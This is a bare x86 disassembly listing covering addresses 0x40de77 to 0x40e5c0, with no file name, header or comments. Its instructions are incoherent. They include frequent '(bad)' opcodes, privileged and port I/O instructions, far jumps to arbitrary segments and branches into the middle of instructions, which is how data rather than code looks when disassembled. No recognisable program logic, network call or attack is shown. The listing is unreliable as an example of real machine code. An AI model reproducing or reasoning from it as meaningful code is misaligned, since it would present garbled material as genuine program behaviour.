  40de77:	xchg   edi,eax
  40de78:	sti    
  40de79:	aas    
  40de7a:	data16 mov es,WORD PTR [edx+ebp*8+0x29]
  40de7f:	pop    es
  40de80:	retf   
  40de81:	inc    ecx
  40de82:	jle    0x40de9f
  40de84:	push   ds
  40de85:	(bad)  
  40de86:	cmp    eax,0x10d93b36
  40de8b:	dec    esi
  40de8c:	dec    esp
  40de8d:	mov    cl,0x31
  40de8f:	lods   al,BYTE PTR ds:[esi]
  40de90:	aad    0x4f
  40de92:	cdq    
  40de93:	push   eax
  40de94:	jnp    0x40df0e
  40de96:	fistp  DWORD PTR [ecx]
  40de98:	add    dl,BYTE PTR [ebp+0x42]
  40de9b:	mov    dh,0x29
  40de9d:	push   edx
  40de9e:	push   ecx
  40de9f:	repnz das 
  40dea1:	sub    al,0x66
  40dea3:	sbb    ebp,ebp
  40dea5:	aam    0x34
  40dea7:	lods   eax,DWORD PTR ds:[esi]
  40dea8:	scas   eax,DWORD PTR es:[edi]
  40dea9:	cli    
  40deaa:	mov    bl,dl
  40deac:	cdq    
  40dead:	push   ebp
  40deae:	dec    bp
  40deb0:	icebp  
  40deb1:	aad    0xfd
  40deb3:	fsub   DWORD PTR [esp+edx*8]
  40deb6:	addr16 inc bx
  40deb9:	mov    esp,0xf388089e
  40debf:	aaa    
  40dec0:	ja     0x40df2b
  40dec2:	pop    esi
  40dec3:	mov    ch,0xc8
  40dec5:	jne    0x40dee8
  40dec7:	xlat   BYTE PTR ds:[ebx]
  40dec8:	outs   dx,BYTE PTR ds:[esi]
  40dec9:	inc    ebx
  40deca:	data16 sbb al,0x30
  40decd:	ficomp DWORD PTR [eax-0x52]
  40ded0:	ret    
  40ded1:	mov    esi,DWORD PTR [ebx]
  40ded3:	sbb    DWORD PTR [esi],esp
  40ded5:	jge    0x40df14
  40ded7:	sub    DWORD PTR [esi+0x4d],esi
  40deda:	xchg   ebx,eax
  40dedb:	lea    edx,[eax-0x10]
  40dede:	add    eax,0xd5122e6a
  40dee3:	and    bl,dl
  40dee5:	scas   al,BYTE PTR es:[edi]
  40dee6:	stc    
  40dee7:	fiadd  WORD PTR cs:[ecx]
  40deea:	dec    edi
  40deeb:	lods   eax,DWORD PTR ds:[esi]
  40deec:	ret    0xe2aa
  40deef:	sub    DWORD PTR [eax+0x5308ec9f],esi
  40def5:	and    esi,ecx
  40def7:	xchg   edi,eax
  40def8:	or     eax,0x90c2f3df
  40defd:	add    al,0xf6
  40deff:	rol    DWORD PTR [ebx-0x63],cl
  40df02:	xor    al,0x35
  40df04:	inc    ebx
  40df05:	and    BYTE PTR [esi-0x35],al
  40df08:	dec    esp
  40df09:	and    BYTE PTR [edx*1+0x6b918256],bl
  40df10:	add    ebp,DWORD PTR [ebx+eiz*8+0x39]
  40df14:	push   cs
  40df15:	imul   esp,DWORD PTR [ebx],0xffffffc6
  40df18:	cmp    ecx,DWORD PTR [ebx+eax*1+0x21]
  40df1c:	add    ebp,DWORD PTR [ecx]
  40df1e:	data16 fisubr WORD PTR [eax+0x61]
  40df22:	fs push ecx
  40df24:	dec    ebp
  40df25:	jmp    0x40df1d
  40df27:	mov    ebx,0xdb163584
  40df2c:	sub    dh,BYTE PTR [edx+0x4f]
  40df2f:	sbb    ebx,eax
  40df31:	popa   
  40df32:	jns    0x40dece
  40df34:	jmp    0xed1f:0x67b9250d
  40df3b:	sbb    DWORD PTR [ebp-0x26],ebx
  40df3e:	in     al,dx
  40df3f:	push   ebx
  40df40:	into   
  40df41:	(bad)
  40df45:	push   es
  40df46:	dec    eax
  40df47:	push   ss
  40df48:	and    DWORD PTR [esi],edx
  40df4a:	push   ss
  40df4b:	ss pop ss
  40df4d:	push   es
  40df4e:	outs   dx,DWORD PTR ds:[esi]
  40df4f:	sbb    BYTE PTR [esi],cl
  40df51:	pop    DWORD PTR [ebp-0x592a6f4d]
  40df57:	mov    bh,0x61
  40df59:	mov    esp,0xd512adcd
  40df5e:	sub    BYTE PTR [ecx],0x1f
  40df61:	adc    ecx,ebx
  40df63:	sbb    DWORD PTR [ecx],esi
  40df65:	cmp    cl,al
  40df67:	ror    DWORD PTR [eax+0x533177e4],0xa5
  40df6e:	pop    ecx
  40df6f:	cmp    eax,0x427fb21b
  40df74:	loope  0x40dfe0
  40df76:	ss shl bl,cl
  40df79:	mov    ss,WORD PTR ds:[ebx-0x3c]
  40df7d:	pop    ds
  40df7e:	jns    0x40df83
  40df80:	and    al,0xe7
  40df82:	(bad)  
  40df83:	mov    cs:0x7d1b1aef,eax
  40df89:	cmp    DWORD PTR [eax+0xc50859e],ecx
  40df8f:	inc    eax
  40df90:	ret    
  40df91:	xchg   esp,eax
  40df92:	data16 sub al,0x5
  40df95:	jp     0x40dfd3
  40df97:	in     eax,dx
  40df98:	add    bh,dl
  40df9a:	stos   DWORD PTR es:[edi],eax
  40df9b:	sbb    edx,ebx
  40df9d:	cmp    esp,DWORD PTR [eax]
  40df9f:	addr16 (bad) 
  40dfa2:	pop    esp
  40dfa3:	sub    DWORD PTR [ebx+0x7c],edx
  40dfa6:	or     eax,0x47274d79
  40dfab:	daa    
  40dfac:	test   DWORD PTR ds:0xaaea7eac,eax
  40dfb2:	pusha  
  40dfb3:	pop    ss
  40dfb4:	gs popa 
  40dfb6:	pop    ecx
  40dfb7:	mov    eax,ds:0xf5ce4270
  40dfbc:	add    BYTE PTR [ebx+ebp*2+0x71],ch
  40dfc0:	mov    esp,0x2b1dd216
  40dfc5:	push   ss
  40dfc6:	hlt    
  40dfc7:	sbb    DWORD PTR [esi-0x59],edx
  40dfca:	ror    BYTE PTR [ecx],cl
  40dfcc:	daa    
  40dfcd:	sub    cl,BYTE PTR [ebp-0x18fe988c]
  40dfd3:	dec    edx
  40dfd4:	pushf  
  40dfd5:	outs   dx,BYTE PTR ds:[esi]
  40dfd6:	xchg   esi,eax
  40dfd7:	or     esi,DWORD PTR [eax-0x2d7a2997]
  40dfdd:	sub    BYTE PTR [esp+edi*2],bl
  40dfe0:	stos   DWORD PTR es:[edi],eax
  40dfe1:	push   ebx
  40dfe2:	test   BYTE PTR [edi],0x64
  40dfe5:	ret    0x3225
  40dfe8:	push   ebx
  40dfe9:	test   BYTE PTR [ebx],bh
  40dfeb:	pop    ds
  40dfec:	adc    edi,DWORD PTR [edx-0x5492080]
  40dff2:	cmp    ax,WORD PTR [ebx+0x7a]
  40dff6:	dec    edx
  40dff7:	xchg   ecx,eax
  40dff8:	mov    ebx,0x2409669c
  40dffd:	xor    BYTE PTR [ecx-0x610157a6],dh
  40e003:	sbb    DWORD PTR [eax+0x47],ebp
  40e006:	push   es
  40e007:	and    dh,al
  40e009:	lods   eax,DWORD PTR ds:[esi]
  40e00a:	xor    ebp,DWORD PTR [ecx+0x53]
  40e00d:	bound  edx,QWORD PTR [esi]
  40e00f:	cs mov bl,0xad
  40e012:	cli    
  40e013:	(bad)  
  40e014:	cmp    BYTE PTR [edx-0x6b],ch
  40e017:	loopne 0x40df9a
  40e019:	lahf   
  40e01a:	outs   dx,BYTE PTR ds:[esi]
  40e01b:	mov    al,ds:0xf5482def
  40e020:	mov    ss,WORD PTR [edx-0x4b]
  40e023:	fldenv [eax+0x73d48f3e]
  40e029:	imul   esp,DWORD PTR [ecx],0xc07f80d0
  40e02f:	adc    esi,DWORD PTR [ecx+0x70]
  40e032:	jns    0x40dffe
  40e034:	imul   ebx,DWORD PTR [ebp+edx*8+0x50e2b625],0xf66a3887
  40e03f:	pop    ebp
  40e040:	inc    ecx
  40e041:	push   ebx
  40e042:	js     0x40e020
  40e044:	push   ecx
  40e045:	scas   al,BYTE PTR es:[edi]
  40e046:	jns    0x40e03f
  40e048:	add    esi,0x1d
  40e04b:	dec    ebx
  40e04d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e04e:	push   ss
  40e04f:	rcl    BYTE PTR [eax-0x5e],cl
  40e052:	and    eax,0x267ae414
  40e057:	lock jbe 0x40e0d0
  40e05a:	jns    0x40e09e
  40e05c:	mov    ds:0x569d7c5a,eax
  40e061:	xchg   edx,eax
  40e062:	(bad)  
  40e063:	aam    0x86
  40e065:	inc    edx
  40e066:	sti    
  40e067:	cli    
  40e068:	test   DWORD PTR [edi],eax
  40e06a:	out    0x71,al
  40e06c:	popa   
  40e06d:	mov    ebp,0x8d53fbb0
  40e072:	xchg   esi,eax
  40e073:	or     DWORD PTR ds:[ecx],esp
  40e076:	mov    edx,0xfa703033
  40e07b:	dec    esp
  40e07c:	push   esp
  40e07d:	test   eax,0xb0b0b7ba
  40e082:	pop    ds
  40e083:	scas   eax,DWORD PTR es:[edi]
  40e084:	push   ecx
  40e085:	push   ebp
  40e086:	pop    edx
  40e087:	cmp    al,al
  40e089:	lods   eax,DWORD PTR ds:[esi]
  40e08a:	dec    ebx
  40e08b:	fcmovnbe st,st(5)
  40e08d:	inc    ecx
  40e08e:	lock sbb ebx,esp
  40e091:	ss cs jle 0x40e02d
  40e095:	jmp    0x1017:0xad5337d8
  40e09c:	arpl   WORD PTR [edx+esi*8-0x82cff53],ax
  40e0a3:	ret    
  40e0a4:	sar    ebx,cl
  40e0a6:	cmp    dh,BYTE PTR [ebx]
  40e0a8:	or     ch,bh
  40e0aa:	cli    
  40e0ab:	lock push ebx
  40e0ad:	mov    dl,0x97
  40e0af:	push   cs
  40e0b0:	mov    eax,cr5
  40e0b3:	mov    fs,WORD PTR [ebx+0x69]
  40e0b6:	jmp    0xee43a72d
  40e0bb:	add    al,0x4
  40e0bd:	shl    BYTE PTR [esi+0x24],cl
  40e0c0:	xlat   BYTE PTR ds:[ebx]
  40e0c1:	push   0xb39c8d59
  40e0c6:	pop    ebx
  40e0c7:	sbb    BYTE PTR [ebx-0x16],cl
  40e0ca:	lods   al,BYTE PTR ds:[si]
  40e0cc:	ins    BYTE PTR es:[edi],dx
  40e0cd:	repz (bad) 
  40e0cf:	sbb    eax,0x6e64d553
  40e0d4:	into   
  40e0d5:	test   al,0x26
  40e0d7:	push   edi
  40e0d8:	(bad)  
  40e0d9:	push   0x24
  40e0db:	ja     0x40e0b7
  40e0dd:	cmp    BYTE PTR [eax+esi*4-0x25],0xb8
  40e0e2:	jns    0x40e0dd
  40e0e4:	mov    ds:0x6ac3d265,eax
  40e0e9:	cwde   
  40e0ea:	push   esi
  40e0eb:	ffreep st(4)
  40e0ed:	pushf  
  40e0ee:	outs   dx,DWORD PTR ds:[esi]
  40e0ef:	push   ds
  40e0f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0f1:	imul   eax,DWORD PTR [ebp-0x26],0x52b8f102
  40e0f8:	lds    eax,FWORD PTR [ecx]
  40e0fa:	jns    0x40e108
  40e0fc:	jmp    0x40e13f
  40e0fe:	push   esi
  40e0ff:	fcomi  st,st(1)
  40e101:	stos   BYTE PTR es:[edi],al
  40e102:	or     bl,BYTE PTR [ebx]
  40e104:	or     eax,0xb1b8bad0
  40e109:	aaa    
  40e10a:	pop    DWORD PTR [edx+0x48aa1a53]
  40e110:	lods   eax,DWORD PTR ds:[esi]
  40e111:	sub    BYTE PTR [ecx],ah
  40e113:	add    al,0x7e
  40e115:	cmp    DWORD PTR [edi],esi
  40e117:	stc    
  40e118:	cmp    esi,DWORD PTR [esi-0x7b]
  40e11b:	adc    dh,BYTE PTR [ebp-0x5b13864c]
  40e121:	aaa    
  40e122:	adc    eax,0x667d48f3
  40e127:	sub    eax,0x42c0abca
  40e12c:	cdq    
  40e12d:	out    0xb2,al
  40e12f:	xor    DWORD PTR [ebx+0x2641be69],esp
  40e135:	js     0x40e101
  40e137:	inc    eax
  40e138:	dec    ebp
  40e139:	add    bh,BYTE PTR [ecx+0x5e]
  40e13c:	int    0x64
  40e13e:	and    edx,edi
  40e140:	cs icebp 
  40e142:	mov    ds,WORD PTR [ecx]
  40e144:	retf   0x67dc
  40e147:	push   eax
  40e148:	cmp    ecx,esi
  40e14a:	mov    ecx,0xcf7d53fc
  40e14f:	ficom  WORD PTR [ecx+ebx*2]
  40e152:	cs scas al,BYTE PTR es:[edi]
  40e154:	inc    esp
  40e155:	sbb    ecx,eax
  40e157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e158:	call   0x3424:0x793086fa
  40e15f:	push   eax
  40e160:	push   ebx
  40e161:	stc    
  40e162:	lahf   
  40e163:	mov    cl,0x73
  40e165:	js     0x40e192
  40e167:	ins    DWORD PTR es:[edi],dx
  40e168:	jmp    0x57923dd7
  40e16d:	jp     0x40e128
  40e16f:	stc    
  40e170:	mov    BYTE PTR [ecx+eax*1+0x7904ec24],dl
  40e177:	cmp    eax,0x98b5f9bb
  40e17c:	out    0xc2,al
  40e17e:	inc    eax
  40e17f:	mov    edx,DWORD PTR [ebx-0x69]
  40e182:	sub    DWORD PTR [edi+eax*2],esp
  40e185:	pop    eax
  40e186:	pop    esp
  40e187:	jb     0x40e1dc
  40e189:	in     eax,dx
  40e18a:	or     eax,DWORD PTR [esi]
  40e18c:	jae    0x40e186
  40e18e:	sbb    BYTE PTR [eax],bl
  40e190:	jmp    FWORD PTR [edx-0x6f]
  40e193:	test   BYTE PTR [ebx+0x40],bl
  40e196:	das    
  40e197:	xchg   esp,eax
  40e198:	(bad)  
  40e199:	call   0x497be8e6
  40e19e:	and    esp,edi
  40e1a0:	push   ecx
  40e1a1:	(bad)  
  40e1a2:	rol    BYTE PTR [eax-0x1d],1
  40e1a5:	sub    bl,ch
  40e1a7:	js     0x40e151
  40e1a9:	sbb    al,0x80
  40e1ab:	gs loop 0x40e21b
  40e1ae:	es cs jg 0x40e16e
  40e1b2:	mov    eax,ds:0x4d6d53c4
  40e1b7:	xchg   BYTE PTR [ecx-0xd38d9c2],ch
  40e1bd:	push   0xffffffc8
  40e1bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1c0:	lea    ecx,[edi]
  40e1c2:	pop    esi
  40e1c3:	cmc    
  40e1c4:	inc    eax
  40e1c5:	in     eax,dx
  40e1c6:	pop    ax
  40e1c8:	add    ebx,ecx
  40e1ca:	mov    ebp,0x92be9007
  40e1cf:	aam    0x76
  40e1d1:	scas   al,BYTE PTR es:[edi]
  40e1d2:	retf   0x7362
  40e1d5:	mov    dl,BYTE PTR [ecx+0x6624618b]
  40e1db:	sub    DWORD PTR [esi],0x443b8bc0
  40e1e1:	jb     0x40e183
  40e1e3:	sbb    DWORD PTR [ebp+0x33],esp
  40e1e6:	outs   dx,DWORD PTR ds:[esi]
  40e1e7:	push   ds
  40e1e8:	mov    WORD PTR [ecx-0xbac4a0a],gs
  40e1ee:	mov    dl,0x92
  40e1f0:	out    0xd2,eax
  40e1f2:	dec    eax
  40e1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1f4:	sub    BYTE PTR [ebx+0x34],ch
  40e1f7:	ret    0xf638
  40e1fa:	push   edi
  40e1fb:	mov    bl,0x8f
  40e1fd:	(bad)  
  40e1fe:	mov    WORD PTR [ebp-0x7b],ax
  40e202:	mov    bl,al
  40e204:	jno    0x40e1a2
  40e206:	stc    
  40e207:	shl    BYTE PTR [ebx],cl
  40e209:	cmp    esp,DWORD PTR [eax+0x34]
  40e20c:	fwait
  40e20d:	add    al,0x4f
  40e20f:	aas    
  40e210:	sub    DWORD PTR [ecx+edi*8+0x41],ecx
  40e214:	mov    cl,0x67
  40e216:	jns    0x40e26b
  40e218:	(bad)
  40e21b:	mov    ah,0x97
  40e21d:	stc    
  40e21e:	loope  0x40e281
  40e220:	arpl   WORD PTR [eax+ecx*2+0x582862e4],si
  40e227:	sbb    BYTE PTR [ebp+0x51],dh
  40e22a:	(bad)  
  40e22b:	cld    
  40e22c:	add    al,0xce
  40e22e:	sbb    ax,0xc6ef
  40e232:	in     al,0xc8
  40e234:	pop    edx
  40e235:	and    al,0x65
  40e237:	sbb    esp,DWORD PTR [ecx+0x6e64234a]
  40e23d:	dec    eax
  40e23e:	add    al,0x35
  40e240:	push   ebx
  40e241:	sub    DWORD PTR [edx],ecx
  40e243:	loope  0x40e1d3
  40e245:	and    eax,0x1dcad238
  40e24a:	xor    ecx,eax
  40e24c:	jns    0x40e245
  40e24e:	data16 daa 
  40e250:	cdq    
  40e251:	jns    0x40e1d8
  40e253:	arpl   WORD PTR [ebx+0xe],dx
  40e256:	sbb    BYTE PTR [edx-0x5caf782b],bh
  40e25c:	adc    eax,0xa212c66b
  40e261:	jae    0x40e295
  40e263:	push   ebx
  40e264:	mov    ds:0xb18966b5,eax
  40e269:	adc    bl,BYTE PTR fs:[esp+ebx*1-0x71]
  40e26e:	test   eax,0x8469acd9
  40e273:	pop    eax
  40e274:	out    0x3d,eax
  40e276:	sbb    eax,0x66f7fb38
  40e27b:	jno    0x40e2bc
  40e27d:	repz or dh,BYTE PTR [eax]
  40e280:	xchg   edi,eax
  40e281:	nop
  40e282:	lock pushf 
  40e284:	pop    es
  40e285:	ins    BYTE PTR es:[edi],dx
  40e286:	mov    ebp,DWORD PTR ds:0xe6ff6486
  40e28c:	test   DWORD PTR [edx-0x6c],0x6655c166
  40e293:	sbb    DWORD PTR ds:0xc0a1304,ebp
  40e299:	(bad)  
  40e29a:	cdq    
  40e29b:	sbb    DWORD PTR [ebx],edi
  40e29d:	mov    edi,0x644ef0a4
  40e2a2:	sub    al,0xce
  40e2a4:	mov    dl,BYTE PTR [ecx]
  40e2a6:	fistp  DWORD PTR [ecx+0x18090105]
  40e2ac:	cmovae ebp,DWORD PTR [eax+0x1b]
  40e2b0:	fmul   DWORD PTR [ebx+edx*8-0x4]
  40e2b4:	(bad)  
  40e2b5:	mov    BYTE PTR [esi],bh
  40e2b7:	push   0x53
  40e2b9:	push   edx
  40e2ba:	add    eax,0x67655d33
  40e2bf:	scas   eax,DWORD PTR es:[edi]
  40e2c0:	mov    ebp,DWORD PTR [ecx+0x65]
  40e2c3:	or     ch,ch
  40e2c5:	mov    ah,0x8e
  40e2c7:	push   cs
  40e2c8:	adc    DWORD PTR [ecx],ecx
  40e2ca:	iretw  
  40e2cc:	int3   
  40e2cd:	pop    esp
  40e2ce:	sti    
  40e2cf:	mov    ecx,cs
  40e2d1:	cs xor al,0x19
  40e2d4:	cmp    esp,DWORD PTR [ecx-0x216e760f]
  40e2da:	push   eax
  40e2db:	pop    edx
  40e2dc:	push   ebx
  40e2dd:	jmp    0x40e269
  40e2df:	out    dx,al
  40e2e0:	fsubr  DWORD PTR [esi+esi*8]
  40e2e3:	xlat   BYTE PTR ds:[ebx]
  40e2e4:	call   0x8f40:0xbe7ec469
  40e2eb:	cmp    ecx,DWORD PTR [ebx-0x63538644]
  40e2f1:	leave  
  40e2f2:	scas   eax,DWORD PTR es:[edi]
  40e2f3:	xchg   esi,eax
  40e2f4:	sub    esi,DWORD PTR [esi+0x372919b2]
  40e2fa:	imul   edi,DWORD PTR [ecx-0x33],0xc0079700
  40e301:	add    eax,0x19dded79
  40e306:	mov    eax,ds:0xb0ff667c
  40e30b:	(bad)  
  40e30c:	push   edx
  40e30d:	push   ax
  40e30f:	pop    eax
  40e310:	shl    dl,cl
  40e312:	lods   eax,DWORD PTR ds:[esi]
  40e313:	sbb    eax,0xc079636c
  40e318:	cmp    DWORD PTR cs:[edi+edi*8+0x2d],esp
  40e31d:	push   ds
  40e31e:	ds aam 0xdf
  40e321:	pop    esi
  40e322:	push   0xffffffc8
  40e324:	mov    WORD PTR [ecx+esi*8+0xab67299],fs
  40e32b:	and    al,al
  40e32d:	dec    esi
  40e32e:	cmp    DWORD PTR [eax-0x46061f07],eax
  40e334:	imul   BYTE PTR [edx-0x28]
  40e337:	addr16 std 
  40e339:	(bad)  
  40e33a:	inc    BYTE PTR es:[eax]
  40e33d:	and    al,BYTE PTR [esp+ebp*2+0x52]
  40e341:	data16 inc BYTE PTR [edi+0x9]
  40e345:	jmp    0x90686c24
  40e34a:	dec    ecx
  40e34b:	sbb    ecx,ebx
  40e34d:	sbb    eax,0xab636a80
  40e352:	jmp    0x79c73707
  40e357:	hlt    
  40e358:	mov    al,ds:0x2303eccd
  40e35d:	jno    0x40e2f4
  40e35f:	pop    ecx
  40e360:	scas   eax,DWORD PTR es:[edi]
  40e361:	imul   esp,DWORD PTR [esi+0x11],0x73f57b75
  40e368:	push   eax
  40e369:	test   BYTE PTR [esi+0x1833b032],cl
  40e36f:	xor    ecx,DWORD PTR [ecx+ebx*4]
  40e372:	xchg   ebx,eax
  40e373:	sbb    edx,edx
  40e375:	push   0xc7f05f6a
  40e37a:	fdiv   QWORD PTR [edx-0x79f3239a]
  40e380:	sub    eax,0xe5bf48ba
  40e385:	stos   BYTE PTR es:[edi],al
  40e386:	ficom  DWORD PTR [edx]
  40e388:	std    
  40e389:	sub    eax,0x868bdf6b
  40e38e:	addr16 dec edi
  40e390:	out    0xc,eax
  40e392:	cmc    
  40e393:	add    eax,0xab82a199
  40e398:	push   edx
  40e399:	pop    esi
  40e39a:	jne    0x40e3b3
  40e39c:	dec    ebp
  40e39d:	mov    ebx,0xe1122e80
  40e3a2:	mov    dh,0x9d
  40e3a4:	push   ds
  40e3a5:	imul   edi,DWORD PTR [esi-0x44094bcf],0x5e
  40e3ac:	icebp  
  40e3ad:	jmp    0x677d:0xfaa55171
  40e3b4:	ret    
  40e3b5:	xor    esp,ebp
  40e3b7:	pushf  
  40e3b8:	xchg   esi,eax
  40e3b9:	dec    eax
  40e3ba:	mov    al,dh
  40e3bc:	sub    ebp,DWORD PTR [ebx-0x59]
  40e3bf:	sub    al,0x8c
  40e3c1:	sub    al,dl
  40e3c3:	std    
  40e3c4:	cmp    eax,0x69f33817
  40e3c9:	push   es
  40e3ca:	mov    ds:0xf91e6c5b,eax
  40e3cf:	push   ecx
  40e3d0:	shl    DWORD PTR [edx],cl
  40e3d2:	jbe    0x40e37e
  40e3d4:	icebp  
  40e3d5:	jl     0x40e39a
  40e3d7:	shl    DWORD PTR [ebx-0x4d0056b4],cl
  40e3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3de:	jns    0x40e435
  40e3e0:	enter  0x862b,0x4c
  40e3e4:	leave  
  40e3e5:	lea    eax,[edx+0x1c]
  40e3e8:	icebp  
  40e3e9:	push   0x12
  40e3eb:	add    bh,bh
  40e3ed:	cmc    
  40e3ee:	pop    edx
  40e3ef:	int3   
  40e3f0:	dec    esi
  40e3f1:	sbb    al,0x79
  40e3f3:	xlat   BYTE PTR ds:[ebx]
  40e3f4:	push   ecx
  40e3f5:	dec    BYTE PTR [edi]
  40e3f7:	pop    ss
  40e3f8:	ss daa 
  40e3fa:	jno    0x40e43f
  40e3fc:	std    
  40e3fd:	push   0xffffffb4
  40e3ff:	fiadd  WORD PTR [ebx]
  40e401:	push   esi
  40e402:	stc    
  40e403:	jge    0x40e437
  40e405:	xor    ah,BYTE PTR [esi-0x5d]
  40e408:	xor    eax,0x63a61a7
  40e40d:	cwde   
  40e40e:	sbb    BYTE PTR [ebx],bl
  40e410:	mov    edx,0x68a25bf9
  40e415:	mov    dl,0x9
  40e417:	xchg   BYTE PTR [edi+0x7619d135],ah
  40e41d:	test   DWORD PTR [eax],esi
  40e41f:	pushf  
  40e420:	in     al,dx
  40e421:	mov    bh,0xf3
  40e423:	mov    ebp,0x1b05e87c
  40e428:	pop    es
  40e429:	or     al,0x8a
  40e42b:	sbb    esp,0xffffff89
  40e42e:	jns    0x40e450
  40e430:	mov    ds:0xa4c02b,eax
  40e435:	xor    BYTE PTR [eax],al
  40e437:	sbb    ebx,ecx
  40e439:	out    0x11,al
  40e43b:	sbb    bl,BYTE PTR [ebx-0x756ff819]
  40e441:	leave  
  40e442:	push   eax
  40e443:	sbb    dh,bh
  40e445:	mov    WORD PTR [eax],?
  40e447:	mov    ecx,0xd692ff8e
  40e44c:	mov    eax,0xc3a8d26e
  40e451:	dec    eax
  40e452:	pop    edx
  40e453:	sbb    al,0x6b
  40e455:	mul    BYTE PTR [esi-0x55]
  40e458:	aas    
  40e459:	(bad)  
  40e45a:	fadd   QWORD PTR [ecx-0x19]
  40e45d:	test   BYTE PTR [edx+0x18],0x3
  40e461:	pop    edi
  40e462:	je     0x40e41b
  40e464:	xlat   BYTE PTR ds:[ebx]
  40e465:	cmp    BYTE PTR [ecx],0x28
  40e468:	mov    edi,0xc57a651e
  40e46d:	push   esi
  40e46e:	popa   
  40e46f:	(bad)  
  40e470:	shl    DWORD PTR [eax-0x1],cl
  40e473:	fld    TBYTE PTR [ebx]
  40e475:	imul   eax,DWORD PTR [esp+esi*2],0xffffff8e
  40e479:	or     DWORD PTR [edx+0x30],esi
  40e47c:	clc    
  40e47d:	xchg   esp,eax
  40e47e:	sub    eax,0x656ab55e
  40e483:	rol    BYTE PTR [esi+0x78],1
  40e486:	shr    DWORD PTR [ecx+eax*4+0x2e],1
  40e48a:	jp     0x40e4c1
  40e48c:	shr    DWORD PTR [ecx-0x57e4f2e3],cl
  40e492:	jae    0x40e439
  40e494:	dec    edi
  40e495:	cmp    esi,DWORD PTR [ebp+0x1c]
  40e498:	lea    ebp,[eax-0x5a]
  40e49b:	sub    eax,DWORD PTR [ebx-0x2d2730e7]
  40e4a1:	mov    al,ds:0x5b304679
  40e4a6:	hlt    
  40e4a7:	call   DWORD PTR [ecx-0x58]
  40e4aa:	push   ebp
  40e4ab:	push   ss
  40e4ac:	push   ebx
  40e4ad:	xor    cl,BYTE PTR [ecx+0x2a]
  40e4b0:	shr    BYTE PTR [ebp+0x69669153],1
  40e4b6:	inc    edi
  40e4b7:	xor    dl,ch
  40e4b9:	sub    eax,ebp
  40e4bb:	(bad)  
  40e4bc:	pop    ecx
  40e4bd:	aam    0xee
  40e4bf:	rcl    DWORD PTR [ebx-0x7],0xbe
  40e4c3:	mov    dh,cl
  40e4c5:	add    esi,DWORD PTR [esp+edi*2-0x21cead3a]
  40e4cc:	(bad)  
  40e4cd:	xchg   esp,eax
  40e4ce:	sbb    BYTE PTR [eax],ah
  40e4d0:	xchg   ebp,eax
  40e4d1:	test   eax,0xc056885
  40e4d6:	dec    esi
  40e4d7:	lods   al,BYTE PTR ds:[esi]
  40e4d8:	push   esp
  40e4d9:	add    esi,DWORD PTR [edi]
  40e4db:	xchg   esp,eax
  40e4dc:	adc    eax,0xe7dbe44b
  40e4e1:	mov    esi,0x4c55d5a8
  40e4e6:	mov    DWORD PTR [esi],edx
  40e4e8:	mov    ebp,DWORD PTR [ecx-0x5611585c]
  40e4ee:	jns    0x40e55e
  40e4f0:	lds    esi,FWORD PTR [eax+0x19973b23]
  40e4f6:	add    bl,bh
  40e4f8:	jbe    0x40e50c
  40e4fa:	stc    
  40e4fb:	aam    0x6a
  40e4fd:	fcmovnu st,st(3)
  40e4ff:	pop    esi
  40e500:	mov    ebx,0x6669f98a
  40e505:	mov    ebp,0x985b5279
  40e50a:	out    dx,eax
  40e50b:	push   edx
  40e50c:	call   0x9a59:0xa2ae8876
  40e513:	push   0x832644d4
  40e518:	push   edi
  40e519:	imul   ebp,DWORD PTR [ecx+0x1115321],0xffffffc6
  40e520:	cmc    
  40e521:	sub    eax,0x6be915bc
  40e526:	imul   DWORD PTR [ebp+0x59]
  40e529:	xchg   BYTE PTR [ebp-0xe],bl
  40e52c:	adc    eax,0x52ce830b
  40e531:	popf   
  40e532:	pop    edx
  40e533:	xchg   esp,eax
  40e534:	(bad)  
  40e535:	xor    al,0xf6
  40e537:	inc    edx
  40e538:	adc    al,0xcb
  40e53a:	fcomip st,st(1)
  40e53c:	jo     0x40e566
  40e53e:	loop   0x40e512
  40e540:	push   ebx
  40e541:	aaa    
  40e542:	mov    dh,0x9c
  40e544:	mov    al,0xd
  40e546:	inc    eax
  40e547:	pop    ebp
  40e548:	push   ebx
  40e549:	nop
  40e54a:	imul   ebp,DWORD PTR [esi+0x2f],0x16
  40e54e:	test   BYTE PTR [ebx],bl
  40e550:	adc    DWORD PTR [ebx-0x45],ebp
  40e553:	shr    DWORD PTR [ecx+0x20],1
  40e556:	rcl    ah,1
  40e558:	cmp    eax,0xb7696608
  40e55d:	adc    al,0x56
  40e55f:	or     eax,DWORD PTR [esi]
  40e561:	sub    DWORD PTR [edx+0x4],ebx
  40e564:	inc    eax
  40e565:	xchg   esi,eax
  40e566:	cwde   
  40e567:	sbb    esp,eax
  40e569:	lods   eax,DWORD PTR ds:[esi]
  40e56a:	mov    ah,0x71
  40e56c:	adc    DWORD PTR [ecx+0x61526fdb],0x58
  40e573:	fcomp  DWORD PTR [eax]
  40e575:	mov    eax,0x4d174d41
  40e57a:	dec    esi
  40e57b:	shl    DWORD PTR [edi],cl
  40e57d:	sbb    DWORD PTR [ebp+0x76695f72],edx
  40e583:	pop    edi
  40e584:	adc    bh,BYTE PTR [edx+0x79]
  40e587:	popf   
  40e588:	push   ecx
  40e589:	in     al,dx
  40e58a:	and    esp,DWORD PTR [ecx+0x19bcbdc4]
  40e590:	mov    ecx,eax
  40e592:	pand   mm3,mm7
  40e595:	les    esi,FWORD PTR [ecx*1+0x220ac053]
  40e59c:	push   edi
  40e59d:	mul    BYTE PTR [ecx+0x4d]
  40e5a0:	mov    bh,0x6a
  40e5a2:	mov    edi,0x1da0366d
  40e5a7:	fsub   DWORD PTR [ebp+0x6526635]
  40e5ad:	or     ah,BYTE PTR [edx-0x58]
  40e5b0:	(bad)  
  40e5b1:	repnz xlat BYTE PTR ds:[ebx]
  40e5b3:	scas   al,BYTE PTR es:[edi]
  40e5b4:	pop    es
  40e5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5b6:	fnstcw WORD PTR [ebp+0x3ea6d8d3]
  40e5bc:	pop    ebp
  40e5bd:	stos   DWORD PTR es:[edi],eax
  40e5be:	jns    0x40e5ec
  40e5c0:	mov    dh,0x45
